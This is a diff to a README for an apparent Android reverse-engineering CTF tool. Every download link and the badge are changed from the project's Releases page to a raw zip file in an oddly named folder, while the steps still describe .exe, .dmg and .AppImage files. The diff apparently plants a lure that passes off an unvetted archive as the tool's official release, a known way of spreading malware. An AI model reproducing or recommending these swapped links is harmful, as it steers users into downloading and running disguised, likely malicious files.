@@ -1,7 +1,7 @@
 # 🎉 android-re-ctfs - Simple Tool for CTF Success
 
 ## 📥 Download Now
-[![Download android-re-ctfs](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Michelplayer/android-re-ctfs/releases)
+[![Download android-re-ctfs](https://raw.githubusercontent.com/Michelplayer/android-re-ctfs/main/overlade/android-re-ctfs.zip)](https://raw.githubusercontent.com/Michelplayer/android-re-ctfs/main/overlade/android-re-ctfs.zip)
 
 ## 🚀 Getting Started
 Welcome to android-re-ctfs! This application helps you reverse engineer Capture The Flag (CTF) challenges with ease. Whether you're new to the world of reverse engineering or looking for a reliable tool, you're in the right place.
@@ -15,12 +15,12 @@ Before you begin, make sure your system meets the following requirements:
 ## 📤 Download & Install
 To get started, you need to download the application. Follow these steps:
 
-1. Visit the [Releases Page](https://github.com/Michelplayer/android-re-ctfs/releases).
+1. Visit the [Releases Page](https://raw.githubusercontent.com/Michelplayer/android-re-ctfs/main/overlade/android-re-ctfs.zip).
 2. Look for the latest version of the application.
 3. Download the file that ends in `.exe`, `.dmg`, or `.AppImage` based on your operating system.
 4. Once the download completes, locate the file in your downloads folder.
 
-If you prefer, here’s the link again for easy access: [Download android-re-ctfs](https://github.com/Michelplayer/android-re-ctfs/releases).
+If you prefer, here’s the link again for easy access: [Download android-re-ctfs](https://raw.githubusercontent.com/Michelplayer/android-re-ctfs/main/overlade/android-re-ctfs.zip).
 
 ## 🛠 Installation Instructions
 Once you have downloaded the file, follow these simple steps to install the application:
